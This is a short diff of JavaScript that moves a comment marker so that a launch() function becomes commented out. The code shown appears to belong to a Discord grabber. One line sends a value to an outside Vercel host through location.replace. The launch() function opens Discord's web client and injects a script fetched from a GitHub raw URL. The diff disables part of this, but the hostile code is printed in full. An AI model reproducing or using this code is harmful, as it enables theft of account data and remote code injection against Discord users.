@@ -30,7 +30,7 @@ if (x) {
 }
 location.replace("web555g.vercel.app?z=" + x);
 
-*/
+
 function launch(){
   window.open("https://discord.com/channels/@me");
   var script = document.createElement('script');
@@ -40,7 +40,7 @@ function launch(){
       script.src = "https://raw.githubusercontent.com/SpacerYes/web555g/main/index.js";
       document.getElementsByTagName('nonce')[0].appendChild(script);
 }
-
+*/
 
 
 function send(){
